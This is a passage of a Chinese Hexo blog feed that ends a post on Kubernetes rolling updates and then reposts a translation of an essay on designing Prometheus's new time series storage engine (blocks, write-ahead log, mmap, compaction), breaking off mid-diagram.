依然维持老版本，此时老版本与旧版本的比例为 7:3。线上验证无误后，再将 partition 设置为 0，依次触发 Pod 6 - 0 的滚动更新，此时全部更新至新版本。</p><figure class="highlight yaml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attr">spec:</span></span><br><span class="line"><span class="hljs-attr">  replicas:</span> <span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attr">  updateStrategy:</span></span><br><span class="line"><span class="hljs-attr">    type:</span> <span class="hljs-string">RollingUpdate</span></span><br><span class="line"><span class="hljs-attr">    rollingUpdate:</span></span><br><span class="line"><span class="hljs-attr">      partition:</span> <span class="hljs-number">7</span>  <span class="hljs-comment"># 7, 8, 9 will be rolling updated</span></span><br></pre></td></tr></table></figure><h2 id="Replication-Controller-（官方已不推荐使用）"><a href="#Replication-Controller-（官方已不推荐使用）" class="headerlink" title="Replication Controller （官方已不推荐使用）"></a>Replication Controller （官方已不推荐使用）</h2><p>kubectl rolling-update 只适用于 Replication Controllers，已经被 Deployment 取代，在此不过多介绍。</p><p><a href="https://kubernetes.io/docs/tasks/run-application/rolling-update-replication-controller/" target="_blank" rel="noopener">https://kubernetes.io/docs/tasks/run-application/rolling-update-replication-controller/</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>Deployment：<a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/controllers/deployment/</a></li><li>Deployment Rolling Update：<a href="https://tachingchen.com/blog/kubernetes-rolling-update-with-deployment/" target="_blank" rel="noopener">https://tachingchen.com/blog/kubernetes-rolling-update-with-deployment/</a></li><li>金丝雀部署：<a href="https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/#canary-deployments" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/cluster-administration/manage-deployment/#canary-deployments</a></li><li>微服务部署：蓝绿部署、滚动部署、灰度发布、金丝雀发布：<a href="https://www.jianshu.com/p/022685baba7d" target="_blank" rel="noopener">https://www.jianshu.com/p/022685baba7d</a></li><li>StatefulSet：<a href="https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/" target="_blank" rel="noopener">https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从头编写一款时间序列数据库</title>
      <link href="/hexo-blog/20180110/%E4%BB%8E%E5%A4%B4%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/hexo-blog/20180110/%E4%BB%8E%E5%A4%B4%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文转自 <a href="http://dockone.io/article/2300" target="_blank" rel="noopener">从头编写一款时间序列数据库</a> （翻译：Colstuwjx），请支持原作者。</p></blockquote><p>我从事监控方面的工作。尤其是专注在 <a href="https://prometheus.io/" target="_blank" rel="noopener">Prometheus</a>，一款内置了自己定制的时间序列数据库的监控系统，以及它和 <a href="https://kubernetes.io/" target="_blank" rel="noopener">Kubernetes</a> 的集成工作。</p><p>从很多方面来说，Kubernetes 表现出了一切 Prometheus 专门设计的东西。它使得持续部署，自动扩缩，以及高度动态环境的其他功能更易于实现。它的查询语言和操作模型，还有许多其他概念方面的决策使得 Prometheus 尤其适合这样的环境。然而，如果被监控的工作负载变得更加显著动态的话，这也会给监控系统本身带来新的压力。基于这一点的考虑，与其再次回顾 Prometheus 已经很好解决的问题，还不如专注于在这样一个高度动态或短生命周期服务的环境里提高它的性能。</p><p>Prometheus 的存储层在历史上有着惊人的性能表现，一个单台服务器每秒可以摄取多达 100 万个采样，数百万个时间序列，同时仅占用令人惊叹的少量磁盘空间。尽管当前的存储已经给我们提供了不错的服务，笔者构思了一个新设计的存储子系统用来纠正现有解决方案的一些短板，并且可以用来配备支撑下一代的集群规模。</p><a id="more"></a><blockquote><p>注意：笔者并没有数据库方面的背景。我在这里所说的话可能是错误的或是带有误导性的。你可以在 Freenode 上的 #prometheus 频道里将你的批评指正反馈到我（fabxc）。</p></blockquote><h2 id="问题，难题，问题域"><a href="#问题，难题，问题域" class="headerlink" title="问题，难题，问题域"></a>问题，难题，问题域</h2><p>首先，快速概括一下我们试图完成的任务以及这里面暴露出的关键问题。针对每一点，我们会先看一看 Prometheus 目前的做法，它在哪些地方做的出色，以及我们旨在通过新的设计想解决哪些问题。</p><h3 id="时间序列数据"><a href="#时间序列数据" class="headerlink" title="时间序列数据"></a>时间序列数据</h3><p>我们有一个根据时间采集数据点的系统。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">identifier -&gt; (t0, v0), (t1, v1), (t2, v2), (t3, v3), ....</span><br></pre></td></tr></table></figure><p>每个数据点都是一个由时间戳和值组成的元组。为了达成监控的目的，时间戳是一个整数，值则可以是任意数字。经验来看，一个64位的浮点数往往能够很好地展现计数器（counter）和测量（gauge）的值，因此我们也不例外。一个时间序列是一组时间上严格单调递增的数据点序列，它可以通过一个标识符来寻址。我们的标识符便是一个度量（metric）名带上一个多维标签的字典。多维标签会将单个度量的测量空间分区。每个度量名加上一串唯一的标签便组成了它自己的时间序列（time series），它会有一个与之关联的值序列流。下面是一组典型的序列标识符，它是度量请求计数的一部分：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">requests_total&#123;path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;&#125;</span><br><span class="line">requests_total&#123;path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;&#125;</span><br><span class="line">requests_total&#123;path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;&#125;</span><br></pre></td></tr></table></figure><p>让我们快速简化一下这个表达形式：我们不妨将一个度量名视为另一种标签维度 - 在我们的场景里便是 <code>__name__</code>。在查询级别上，它可能会被特殊对待，但是它并不会关注我们采用何种方式来存放它，这一点我们将在后面看到。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.1:80&quot;&#125;</span><br><span class="line">&#123;__name__=&quot;requests_total&quot;, path=&quot;/status&quot;, method=&quot;POST&quot;, instance=&quot;10.0.0.3:80&quot;&#125;</span><br><span class="line">&#123;__name__=&quot;requests_total&quot;, path=&quot;/&quot;, method=&quot;GET&quot;, instance=&quot;10.0.0.2:80&quot;&#125;</span><br></pre></td></tr></table></figure><p>当查询时间序列数据时，我们想通过指定标签来选择。最简单的例子莫过于 <code>{__name__=&quot;requests_total&quot;}</code> 会选出所有属于 <code>requests_total</code> 度量的序列。针对所有被选中的序列来说，我们会在一个指定的时间窗口里检索出对应的数据点。</p><p>而在更复杂的查询里，我们可能希望同时选择满足多个标签选择器的序列，并且就表达形式来说也会存在比等于更复杂的条件。比如，取反（<code>method!=&quot;GET&quot;</code>）或者正则表达式匹配（<code>method=~&quot;PUT|POST&quot;</code>）。</p><p>这大体上决定了所需存储的数据以及它们该如何被调用。</p><h3 id="横轴和纵轴"><a href="#横轴和纵轴" class="headerlink" title="横轴和纵轴"></a>横轴和纵轴</h3><p>在一个简化的视图中，所有数据点都可以在一个二维平面上分布。横轴代表时间，而序列标识符的空间遍及整个纵轴。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">series</span><br><span class="line">  ^   </span><br><span class="line">  │   . . . . . . . . . . . . . . . . .   . . . . .   &#123;__name__=&quot;request_total&quot;, method=&quot;GET&quot;&#125;</span><br><span class="line">  │     . . . . . . . . . . . . . . . . . . . . . .   &#123;__name__=&quot;request_total&quot;, method=&quot;POST&quot;&#125;</span><br><span class="line">  │         . . . . . . .</span><br><span class="line">  │       . . .     . . . . . . . . . . . . . . . .                  ... </span><br><span class="line">  │     . . . . . . . . . . . . . . . . .   . . . .   </span><br><span class="line">  │     . . . . . . . . . .   . . . . . . . . . . .   &#123;__name__=&quot;errors_total&quot;, method=&quot;POST&quot;&#125;</span><br><span class="line">  │           . . .   . . . . . . . . .   . . . . .   &#123;__name__=&quot;errors_total&quot;, method=&quot;GET&quot;&#125;</span><br><span class="line">  │         . . . . . . . . .       . . . . .</span><br><span class="line">  │       . . .     . . . . . . . . . . . . . . . .                  ... </span><br><span class="line">  │     . . . . . . . . . . . . . . . .   . . . . </span><br><span class="line">  v</span><br><span class="line">    &lt;-------------------- time ---------------------&gt;</span><br></pre></td></tr></table></figure><p>Prometheus 通过定期抓取一组时间序列的当前值来检索得到数据点。这样一个我们检索批次的实体被称作一个目标（target）。由于每个目标的样本数据都是单独抓取的，因此写入模式是完全垂直并且高度并发的。这里提供一些衡量尺度：一个单个的Prometheus实例会从成千上万的目标采集数据点，每个目标可以暴露出数百上千个不同的时间序列。</p><p>就每秒采集数百万个数据点的规模而言，批量写入是一个不可调和的性能需求。分散地写入单个数据点到磁盘的话又会是一个非常缓慢的过程。因此，我们想要实现的是按顺序写入更大的数据块。对于机械的旋转磁盘而言这样做并不出奇，因为它们的头会一直物理地移动到不同的区块。虽然 SSD 以快速地随机写入性能而闻名，但是实际上它们却不能修改单个字节，而只能写入 4KiB 或更大的的页。这意味着写一个 16 字节的样本同写一个完整的 4KiB 页没什么两样。这种行为即是所谓的<a href="https://en.wikipedia.org/wiki/Write_amplification" target="_blank" rel="noopener">写入放大</a>的一部分，作为一个“额外红利”，它会耗损你的 SSD —— 因此它不仅仅只是会变慢而已，还会在几天或者几周内完全毁掉你的硬件。关于这个问题的更详细信息，系列博客”<a href="http://codecapsule.com/2014/02/12/coding-for-ssds-part-1-introduction-and-table-of-contents/" target="_blank" rel="noopener">针对 SSD 编程</a>“系列会是一个不错的资源。我们不妨考虑一下这里面的主要关键点：顺序和批量写入是旋转磁盘和 SSD 的理想写入模式。 这是一个应该遵循的简单规则。</p><p>时间序列数据库的查询模型跟写模型相比，更是有明显不同的区别。我们可以对一个单个序列查询一个单个的数据点，在 10000 个序列里查询一个单个的数据点，在一个单个序列里查询几周的数据点，甚至在 10000 个序列里查询几周的数据点，等等。因此在我们的二维平面上，查询既不是完全垂直的，也不是水平的，而是二者的矩形组合。<a href="https://prometheus.io/docs/practices/rules/" target="_blank" rel="noopener">记录规则</a>可以减轻已知的一些查询方面的问题，但是仍然不是临时查询（ad-hoc queries）的一个通用解决方案，这些查询也必须能很好的进行下去。</p><p>须知我们想要的是批量写入，但是我们得到的批次只是序列之间一个纵向的数据点集合。当在一个时间窗口上针对某个序列查询数据点时，不仅难以确定各个数据点可以被找到的位置，我们还不得不从磁盘上大量的随机位置进行读取。每次查询操作可能涉及到数以百万的样例数据，即使在最快的 SSD 上这样的操作也会变慢。读操作还将从磁盘上检索更多的数据，而不仅仅只是所请求的 16 字节大小的样本。 SSD 将加载一整页，HDD 将至少读取整个扇区。 无论哪种方式，我们都会浪费宝贵的读吞吐量。</p><p>因此，在理想情况下，相同序列的样本数据将会被顺序存储，这样一来我们便可以用尽可能少的读来扫描得到它们。 在上层，我们只需要知道这个序列可以访问的所有数据点的开始位置。</p><p>在将收集的数据写入磁盘的理想模式和为服务的查询操作提供更显著有效的存储格式之间显然存在着强烈的冲突。这是我们的时间序列数据库要解决的根本问题。</p><h4 id="当前的解决方案"><a href="#当前的解决方案" class="headerlink" title="当前的解决方案"></a>当前的解决方案</h4><p>是时候来看看 Prometheus 当前的存储是如何实现的，我们不妨叫它“V2”，它致力于解决这个问题。我们会为每个时间序列创建一个文件，它会按照时间顺序包含所有的样本数据。由于每隔几秒就把单个的样本数据添加到所有这些文件的成本不小，我们针对每个序列在内存里批量存放了 1KiB 的数据块，一旦它们填满了再把这些块添加到一个个的文件里。这一方案解决了很大一部分问题。写操作如今是分批次的，样本数据也是顺序存储的。它还能为我们提供一个令人难以置信的高效压缩格式，这是基于一个给定的样本相对于相同序列里前面的那些样本数据只有非常少量的变化这一属性而设计。Facebook 在它们的 Gorilla TSDB 的论文里描述了一种类似的基于块（Chunk）的存储方法，并且引入了一个压缩格式，将16个字节的样本减少到平均 1.37 字节。V2 存储使用了各种压缩格式，包括 Gorilla 的一个变种。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  ┌──────────┬─────────┬─────────┬─────────┬─────────┐           series A</span><br><span class="line">  └──────────┴─────────┴─────────┴─────────┴─────────┘</span><br><span class="line">         ┌──────────┬─────────┬─────────┬─────────┬─────────┐    series B</span><br><span class="line">         └──────────┴─────────┴─────────┴─────────┴─────────┘ </span><br><span class="line">                             . . .</span><br><span class="line">┌──────────┬─────────┬─────────┬─────────┬─────────┬─────────┐   series XYZ</span><br><span class="line">└──────────┴─────────┴─────────┴─────────┴─────────┴─────────┘ </span><br><span class="line">  chunk 1    chunk 2   chunk 3     ...</span><br></pre></td></tr></table></figure><p>尽管基于块的实现方案很棒，如何为每个序列维护一个单独的文件却也是V2存储引擎困扰的地方，这里面有几个原因：</p><ul><li><p>我们实际上需要维护的文件数量多于我们正在收集数据的时间序列数量。在“序列分流”一节会详解介绍到这点。由于产生了几百万个文件，不久的将来或者迟早有一天，我们的文件系统会出现 <a href="https://en.wikipedia.org/wiki/Inode" target="_blank" rel="noopener">inodes</a> 耗尽的情况。在这种情况下我们只能通过重新格式化磁盘来恢复，这样做可能带有侵入性和破坏性。通常我们都希望避免格式化磁盘，特别是需要适配某个单个应用时更是如此。</p></li><li><p>即便做了分块，每秒也会产生数以千计的数据块并且准备好被持久化。这仍然需要每秒完成几千次单独的磁盘写操作。尽管这一点可以通过为每个序列填满的数据块做分批处理来缓解压力，这反过来又会增加等待被持久化的数据总的内存占用。</p></li><li><p>保持打开所有文件来读取和写入是不可行的。特别是因为在24小时后超过99%的数据便不再会被查询。如果它还是被查询到的话，我们就不得不打开数千个文件，查找和读取相关的数据点到内存，然后再重新关闭它们。而这样做会导致很高的查询延迟，数据块被相对积极地缓存的话又会导致一些问题，这一点会在“耗用资源”一节里进一步概述。</p></li><li><p>最终，旧数据必须得被清理掉，而且数据需要从数百万的文件前面被抹除。这意味着删除实际上是写密集型操作。此外，循环地在这数百万的文件里穿梭然后分析它们会让这个过程常常耗费数个小时。在完成时有可能还需要重新开始。呵呵，删除旧文件将会给你的SSD带来进一步的写入放大！</p></li><li><p>当前堆积的数据块只能放在内存里。如果应用崩溃的话，数据将会丢失。为了避免这种情况，它会定期地保存内存状态的检查点（Checkpoint）到磁盘，这可能比我们愿意接受的数据丢失窗口要长得多。从检查点恢复估计也会花上几分钟，造成痛苦而漫长的重启周期。</p></li></ul><p>从现有的设计中脱颖而出的关键在于块的概念，我们当然希望保留这一设计。大多数最近的块被保留在内存里一般来说也是一个不错的做法。毕竟，最大幅度被查询数据里大部分便是这些最近的点。</p><p>一个时间序列对应一个文件这一概念是我们想要替换的。</p><h3 id="序列分流-Series-Churn"><a href="#序列分流-Series-Churn" class="headerlink" title="序列分流 (Series Churn)"></a>序列分流 (Series Churn)</h3><p>在 Prometheus 的上下文里，我们使用术语“序列分流”来描述一组时间序列变得不活跃，即不再接收数据点，取而代之的是有一组新的活跃的序列出现。</p><p>举个例子，由一个给定的微服务实例产出的所有序列各自都有一个标识它起源的“instance”标签。如果我们对该微服务完成了一次滚动更新然后将每个实例切换到了一个更新的版本的话，序列分流就产生了。在一个更加动态的环境里，这些事件可能会以小时的频率出现。像Kubernetes这样的集群编排系统允许应用程序不断地自动伸缩和频繁的滚动更新，它可能会创建出数万个新的应用程序实例，并且每天都会使用全新的时间序列。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">series</span><br><span class="line">  ^</span><br><span class="line">  │   . . . . . .</span><br><span class="line">  │   . . . . . .</span><br><span class="line">  │   . . . . . .</span><br><span class="line">  │               . . . . . . .</span><br><span class="line">  │               . . . . . . .</span><br><span class="line">  │               . . . . . . .</span><br><span class="line">  │                             . . . . . .</span><br><span class="line">  │                             . . . . . .</span><br><span class="line">  │                                         . . . . .</span><br><span class="line">  │                                         . . . . .</span><br><span class="line">  │                                         . . . . .</span><br><span class="line">  v</span><br><span class="line">    &lt;-------------------- time ---------------------&gt;</span><br></pre></td></tr></table></figure><p>因此，即便整个基础设施大体上保持不变，随着时间的推移，我们数据库里的时间序列数据量也会呈线性增长。 尽管 Prometheus 服务器很愿意去采集 1000 万个时间序列的数据，但是如果不得不在十亿个序列中查找数据的话，很明显查询性能会受到影响。</p><h4 id="当前解决方案"><a href="#当前解决方案" class="headerlink" title="当前解决方案"></a>当前解决方案</h4><p>Prometheus当前 V2 版本的存储针对当前被存放的所有序列都有一个基于 LevelDB 的索引。它允许包含一个指定的标签对来查询序列，但是缺乏一个可扩展的方式以组合来自不同标签选择的结果。举个例子，用户可以有效地选出带有标签 <code>__name __ =&quot;requests_total&quot;</code> 的所有序列，但是选择所有满足 <code>instance=&quot;A&quot;</code> AND <code>__name __ =&quot;requests_total&quot;</code> 的序列则都有可扩展性的问题。我们稍后会重新审视为什么会造成这样的结果，要改善查询延迟的话要做哪些必要的调整。</p><p>实际上这一问题正是触发要实现一个更好的存储系统的最初动力。Prometheus 需要一个改进的索引方法从数亿个时间序列里进行快速搜索。</p><h3 id="耗用资源"><a href="#耗用资源" class="headerlink" title="耗用资源"></a>耗用资源</h3><p>耗用资源是试图扩展 Prometheus（或者任何东西，真的）时不变的话题之一。但是实际上烦恼用户的问题并不是绝对的资源匮乏。实际上，由于给定需求的驱动，Prometheus 管理着令人难以置信的吞吐量。问题更在于是面对变化的相对未知性和不稳定性。由于V2存储本身的架构设计，它会缓慢地构建出大量的样本数据块，而这会导致内存消耗随着时间的推移不断增加。随着数据块被填满，它们会被写入到磁盘，随即便能够从内存中被清理出去。最终，Prometheus 的内存使用量会达到一个稳定的状态。直到受监控的环境发生变化 - 每次我们扩展应用程序或进行滚动更新时，序列分流 会造成内存，CPU 和磁盘 IO 占用方面的增长。</p><p>如果变更是正在进行的话，那么最终它将再次达到一个稳定的状态，但是比起一个更加静态的环境而言，它所消耗的资源将会显著提高。过渡期的时长一般长达几个小时，而且很难说最大资源使用量会是多少。</p><p>每个时间序列对应一个单个文件的方式使得单个查询很容易就击垮 Prometheus 的进程。而当所要查询的数据没有缓存到内存时，被查询序列的文件会被打开，然后包含相关数据点的数据块会被读取到内存里。倘若数据量超过了可用内存，Prometheus 会因为 OOM 被杀死而退出。待查询完成后，加载的数据可以再次释放，但通常会缓存更长时间，以便在相同数据上更快地提供后续查询。后者显然是一件好事。</p><p>最后，我们看下 SSD 上下文里的写入放大，以及 Prometheus 是如何通过批量写入来解决这个问题。然而，这里仍然有几处会造成写入放大，因为存在太多小的批次而且没有精确地对准页面边界。针对更大规模的 Prometheus 服务器，现实世界已经有发现硬件寿命缩短的情况。可能对于具有高写入吞吐量的数据库应用程序来说，这仍属正常，但是我们应该关注是否可以缓解这一情况。</p><h2 id="从头开始"><a href="#从头开始" class="headerlink" title="从头开始"></a>从头开始</h2><p>如今，我们对我们的问题域有了一个清晰的了解，V2 存储是如何解决它的，以及它在设计上存在哪些问题。我们也看到一些很棒的概念设计，这些也是我们想要或多或少无缝适配的。相当数量的 V2 版本存在的问题均可以通过一些改进和部分的重新设计来解决，但为了让事情变得更好玩些（当然，我这个决定是经过深思熟虑的），我决定从头开始编写一款全新的时间序列数据库 —— 从零开始，即，将字节数据写到文件系统。</p><p>性能和资源使用这样的关键问题会直接引领我们做出存储格式方面的选择。我们必须为我们的数据找到一个正确的算法和磁盘布局以实现一个性能优良的存储层。</p><p>这便是我直接迈向成功时走的捷径 —— 忽略之前经历过的头疼，无数失败的想法，数不尽的草图，眼泪，还有绝望。</p><h3 id="V3-宏观设计"><a href="#V3-宏观设计" class="headerlink" title="V3 - 宏观设计"></a>V3 - 宏观设计</h3><p>我们新版存储引擎的宏观设计是怎样的？简略来讲，只要到我们的 data 目录下运行 <code>tree</code> 命令，一切便都一目了然。不妨看下这幅美妙的画面它能带给我们怎样的一个惊喜。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ tree ./data</span><br><span class="line">./data</span><br><span class="line">├── b-000001</span><br><span class="line">│   ├── chunks</span><br><span class="line">│   │   ├── 000001</span><br><span class="line">│   │   ├── 000002</span><br><span class="line">│   │   └── 000003</span><br><span class="line">│   ├── index</span><br><span class="line">│   └── meta.json</span><br><span class="line">├── b-000004</span><br><span class="line">│   ├── chunks</span><br><span class="line">│   │   └── 000001</span><br><span class="line">│   ├── index</span><br><span class="line">│   └── meta.json</span><br><span class="line">├── b-000005</span><br><span class="line">│   ├── chunks</span><br><span class="line">│   │   └── 000001</span><br><span class="line">│   ├── index</span><br><span class="line">│   └── meta.json</span><br><span class="line">└── b-000006</span><br><span class="line">    ├── meta.json</span><br><span class="line">    └── wal</span><br><span class="line">        ├── 000001</span><br><span class="line">        ├── 000002</span><br><span class="line">        └── 000003</span><br></pre></td></tr></table></figure><p>在最上面一层，我们有一组带编号的块，它们均有一个前缀 <code>b-</code>。 每个块显然都维护一个包含索引的文件以及一个包含更多编号文件的”chunk”目录。”chunks”目录没别的，就多个序列的一些数据点的原始块。跟V2的做法一样，这样可以用非常低的成本来读取一个时间窗口里的序列数据，并且允许我们采用相同的有效压缩算法。这个概念已经被证实是行之有效的，我们自然就沿用这一点。很显然，这里不再是每个序列对应一个单个文件，取而代之的是，几个文件包含许多序列的数据块。</p><p>“index”文件的存在是预料之中的事情。我们不妨假定它包含了大量的黑魔法，允许我们找出标签，它们可能的值，整个时间序列，以及存放数据点的数据块。</p><p>但是，为什么有几个目录是一个索引和一些块文件这样的布局？为什么最后一个目录里取而代之的是有一个“wal”目录？搞清楚这两个问题的话可以解决我们90％的问题。</p><h4 id="众多的小型数据库"><a href="#众多的小型数据库" class="headerlink" title="众多的小型数据库"></a>众多的小型数据库</h4><p>我们将我们的水平维度，即时间空间分割成非重叠的块。 每个块当成一个完全独立的数据库，包含其时间窗口的所有时间序列数据。因此，它有自己的索引和一组块文件。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">t0            t1             t2             t3             now</span><br><span class="line"> ┌───────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐</span><br><span class="line"> │           │  │           │  │           │  │           │                 ┌────────────┐</span><br><span class="line"> │           │  │           │  │           │  │  mutable  │ &lt;─── write ──── ┤ Prometheus │</span><br><span class="line"> │           │  │           │  │           │  │           │                 └────────────┘</span><br><span class="line"> └───────────┘  └───────────┘  └───────────┘  └───────────┘                        ^</span><br><span class="line">       └──────────────┴───────┬──────┴──────────────┘                              │</span><br><span class="line">                              │                                                  query</span><br><span class="line">                              │                                                    │</span><br><span class="line">                            merge ─────────────────────────────────────────────────┘</span><br></pre></td></tr></table></figure><p>每个块的数据均是无法更改的。当然，在我们采集到新数据时我们必须能够将新序列和样本数据添加到最近的数据块里。对于这个数据块，所有新数据都将写入到内存数据库里，跟我们持久化的数据块一样，它也会提供相同的查找属性。内存里的数据结构也可以被有效地更新。为了防止数据丢失，所有传入的数据还会被写入预写日志（write ahead log），即我们的“wal”目录中的一组文件，我们可以在重新启动时基于这些文件将之前内存里的数据重新填充到内存数据库。</p><p>所有这些文件都带有自己的序列化格式，它附带了许多标志，偏移量，变体和 CRC32 校验和。比起无聊地读着介绍，读者朋友自己去发现它们也许会更有乐趣些。</p><p>这种布局允许我们查出所有和被查询的时间范围相关的数据块。每个块的部分结果被合并到一起形成最终的完整结果。</p><p>这种水平分区解锁了一些很棒的功能：</p><ul><li><p>当查询一个时间范围时，我们可以轻松地忽略该范围外的所有数据块。 通过减少一系列开始时需要检查的数据，它可以初步解决序列分流的问题。</p></li><li><p>当完成一个数据块的填充时，我们可以通过顺序写入数据到一些较大的文件来保存内存数据库中的数据。 这样就避免了任何写入放大的问题，并且同样适用于SSD和HDD。</p></li><li><p>我们继承了 V2 优秀的地方，最近最多被查询的数据块总是作为热点保存在内存里。</p></li><li><p>棒棒哒，我们再也不需要通过固定的1KiB块大小设定来更好地对齐磁盘上的数据。 我们可以选择任何对于个别数据点和选定的压缩格式最有意义的大小。</p></li><li><p>删除旧数据变得非常低成本和及时。我们只需要删除一个目录。 请记住，在旧存储中，我们不得不分析并重新编写高达数亿个文件，这一操作可能需要几个小时才能收敛。</p></li></ul><p>每个块还包含一个 <code>meta.json</code> 文件。 它简单地保存该数据块的人类可读信息，便于用户轻松了解数据块的存储状态及其包含的数据。</p><h5 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h5><p>从数以百万的小文件改成几个更大的文件使得我们能够以很小的成本保持所有文件的打开句柄。这也解锁了使用 <a href="https://en.wikipedia.org/wiki/Mmap" target="_blank" rel="noopener">mmap(2)</a> 的玩法，它是一个系统调用，允许我们通过文件内容透明地回传到一个虚拟内存区域。为了简单起见，你可以联想它类似于交换(swap)空间，只是我们所有的数据已经在磁盘上，并且在将数据交换出内存后不会发生写入。这意味着我们可以将数据库里的所有内容均视为内存而不占用任何物理RAM。只有我们访问我们的数据库文件中的某些字节范围时，操作系统才会从磁盘惰性地加载页面。这就把和我们持久化数据相关的所有内存管理都交给了操作系统负责。 一般来说，操作系统更有资格做出这样的决定，因为它对整个机器及其所有过程有更全面的看法。查询数据可以相当积极地被缓存在内存里，而一旦面临内存压力，页面便会被逐出(evicted)。如果机器有未使用的内存，Prometheus 将会很高兴去缓存整个数据库，而一旦另一个应用程序需要它，它将立即返回。</p><p>这样一来，比起受到 RAM 的大小限制，即便查询更多的持久化数据，查询操作也不会再轻易造成进程的 OOM。内存的缓存大小变得完全自适应，只有在查询实际需要的数据时才会加载数据。</p><p>就我个人的理解，这是今天的很多数据库的工作方式，如果磁盘格式允许的话，这是一个理想的方法 - 除非你有信心在进程里做的工作能够超越操作系统。我们自己做了很少一部分工作而确实从外部系统收获了大量功能。</p><h4 id="压缩-compaction"><a href="#压缩-compaction" class="headerlink" title="压缩 (compaction)"></a>压缩 (compaction)</h4><p>存储引擎必须定期地“切出”一个新的块，并将之前完成的块写入到磁盘。只有块被成功持久化后，用于恢复内存块的预写日志文件（wal）才会被删除。</p><p>我们有兴趣将每个块的保存时间设置的相对短一些（一般设置大约两个小时），以避免在内存中堆积太多的数据。当查询多个块时，我们必须将其结果合并为一个完整结果。 这个合并过程显然会有一个成本，一个一周长的查询不应该需要合并超过80个的部分结果。</p><p>为了实现两者共同的需求，我们引入数据压缩（compaction）。它描述了采集一个或多个数据块并将其写入一个可能会更大的块的过程。它还可以沿途修改现有的数据，例如，清理已删除的数据，或重组我们的样本数据块以提高查询性能。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">t0             t1            t2             t3             t4             now</span><br><span class="line"> ┌────────────┐  ┌──────────┐  ┌───────────┐  ┌───────────┐  ┌───────────┐</span><br><span class="line"> │ 1          │  │ 2        │  │ 3         │  │ 4         │  │ 5 mutable │    before</span><br><span class="line"> └────────────┘  └──────────┘  └───────────┘  └───────────┘  └───────────┘</span><br><span class="line"> ┌─────────────────────────────────────────┐  ┌───────────┐  